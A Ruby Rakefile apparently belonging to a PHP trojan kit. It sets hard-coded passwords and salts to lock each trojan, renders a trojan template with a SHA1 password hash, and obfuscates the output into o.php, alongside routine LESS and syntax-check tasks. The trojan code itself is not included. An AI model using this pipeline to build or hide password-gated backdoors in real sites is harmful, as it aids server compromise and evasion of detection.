
# specify passwords to lock each trojan
locks = {
    :one => {
        :password => 'b4afcf3d99',
        :salt     => 'ddb28e78ab',
        :hash     => 'the-hash',
    },
    :two => {
        :password => '3dadef2cf4',
        :salt     => '6cbdb4798a',
        :hash     => 'the-hash',
    },
}

# ----------------------------------------------------------------------------
require 'digest/sha1'
require 'erb'
include ERB::Util


namespace :build do

    desc "Compiles the less into css"
    task :less do
        `lessc './lib/css/main.less' > './lib/css/main.css'`
        puts 'Less compiled.'
    end

    namespace :trojans do

        desc "Compiles the trojan into a minified and obfuscated form."
        task :php do
            # calculate the password hash
            locks[:one][:hash] = Digest::SHA1.hexdigest(locks[:one][:password] + locks[:one][:salt])

            # compile the trojan's erb template
            erb = ERB.new(File.read('./trojans/plaintext/trojan.php.erb'), 0, '<>', 'buffer')

            # write the erb result to a temporary file
            f = File.new('./trojans/plaintext/tmp.trojan.php', 'w')
            f.write(erb.result(binding))
            f.close

            # process the temporary file with the PHP minifier and obfuscator
            puts `php -f ./lib/build/obfuscate.php './trojans/plaintext/tmp.trojan.php' > ./trojans/obfuscated/o.php`

            # delete the temporary file
            File.delete('./trojans/plaintext/tmp.trojan.php')
        end
    end
end

namespace :test do
    desc "Checks for file syntax errors."
    task :check_syntax do
        puts 'Checking PHP files...'
        puts `find . -name '*.php' -print0 | xargs -0 -n1 -P10 php -l`

        # @todo: this doesn't display the names of the files it checks
        puts 'Checking Ruby files...'
        puts `find . -name '*.rb' -print0 | xargs -0 -n1 -P10 ruby -c`
    end
end
